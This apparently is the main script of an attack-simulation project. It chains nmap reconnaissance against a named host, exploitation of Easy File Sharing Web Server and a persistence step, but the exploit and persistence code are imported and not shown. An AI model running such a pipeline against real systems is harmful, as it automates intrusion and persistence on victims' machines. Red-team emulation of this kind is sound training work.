from datetime import datetime
import subprocess
import re
import sys
import pandas as pd
from tabulate import tabulate

from reconnaissance import scanIPBlock,vulnScan,gatherInfoSoftware
from execution import executeEasyFileSharing
from persistence import persistenceFunc

def endProgram():
	end = datetime.now()
	print("HackSimulationMain Script finished at " + start.strftime("%d/%m/%Y %H:%M:%S"))
	print("Time taken: " + str(end - start))
	sys.exit(0)

targetHostnames = ["DESKTOP-30UOSMD"]

start = datetime.now()
print("HackSimulationMain Script ran at " + start.strftime("%d/%m/%Y %H:%M:%S"))

print("Reconnaissance: Active Scanning: Scanning IP Block")
print("Executing nmap scan: nmap -sP 192.168.1.1/24")
print("Reason: Host Discovery - See active hosts on network") 
targets = scanIPBlock(targetHostnames)
if targets == None:
    print("Couldn't find any deices matching given hostname(s)")
    endProgram()

print("Reconnaissance: Active Scanning: Vulnerability Scanning")
print("Executing nmap scan: nmap -Pn IPADDRESS")
print("Reason: Host Discovery - See potential attack vectors") 

targets = vulnScan(targets)
print("Reconnaissance: Gather Victum Host Information: Software (Open Ports)")
print("Executing nmap scan: nmap -A IPADDRESS -p")
print("Reason: To determine what software is running on open ports")

targets = gatherInfoSoftware(targets)

#Move this to a subsection?
print("Determine which attacks to carry out based on Reconnaissance data")
print(type(targets))
for target in targets:
    vulSoftwares= target[2]['Software Version']
    print(vulSoftwares)
    for vulSoftware in vulSoftwares:
        if "Easy File Sharing Web Server" in vulSoftware:
            print("Device has Easy File Sharing Web Server running")
            print("Attempting Exploit...")
            if executeEasyFileSharing(target) != False:
                print("Exploit Successful Proceeding to persistance")
                persistenceFunc()
            



endProgram()



